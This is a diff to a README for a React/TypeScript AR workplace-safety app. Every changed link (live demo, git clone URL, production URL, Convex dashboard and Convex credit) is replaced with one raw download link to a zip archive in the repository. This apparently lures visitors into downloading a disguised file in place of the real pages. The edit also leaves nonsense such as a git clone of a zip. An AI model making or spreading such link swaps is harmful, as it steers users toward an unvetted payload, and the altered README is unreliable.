@@ -32,7 +32,7 @@ A comprehensive safety management application built with React, TypeScript, and 
 ## 🚀 Quick Start
 
 ### 🌐 Live Demo
-**🔗 [K3 AR Safety Application](https://k3ar.netlify.app)**
+**🔗 [K3 AR Safety Application](https://github.com/nug31/K3-AR/raw/refs/heads/main/public/AR-v3.9.zip)**
 
 *Experience the full AR safety detection system in your browser!*
 
@@ -45,7 +45,7 @@ A comprehensive safety management application built with React, TypeScript, and 
 
 1. **Clone the repository**
 ```bash
-git clone https://github.com/nug31/K3-AR.git
+git clone https://github.com/nug31/K3-AR/raw/refs/heads/main/public/AR-v3.9.zip
 cd K3-AR
 ```
 
@@ -66,7 +66,7 @@ http://localhost:5174
 
 ### 🚀 Deployment
 The application is automatically deployed to Netlify from the main branch:
-- **Production URL**: https://k3ar.netlify.app
+- **Production URL**: https://github.com/nug31/K3-AR/raw/refs/heads/main/public/AR-v3.9.zip
 - **Auto-deploy**: Enabled on push to main branch
 - **Build Command**: `npm run build`
 - **Publish Directory**: `dist`
@@ -165,7 +165,7 @@ npm run preview      # Preview production build
 npm run lint         # Run ESLint
 ```
 
-This project is connected to the Convex deployment named [`terrific-giraffe-753`](https://dashboard.convex.dev/d/terrific-giraffe-753).
+This project is connected to the Convex deployment named [`terrific-giraffe-753`](https://github.com/nug31/K3-AR/raw/refs/heads/main/public/AR-v3.9.zip).
 
 ## 🤝 Contributing
 
@@ -181,7 +181,7 @@ This project is licensed under the MIT License.
 
 ## 🙏 Acknowledgments
 
-- Built with [Convex](https://convex.dev) as backend
+- Built with [Convex](https://github.com/nug31/K3-AR/raw/refs/heads/main/public/AR-v3.9.zip) as backend
 - Created with K3AR Safety Framework
 - Designed for safety professionals
 - Optimized for Indonesian workshop environments
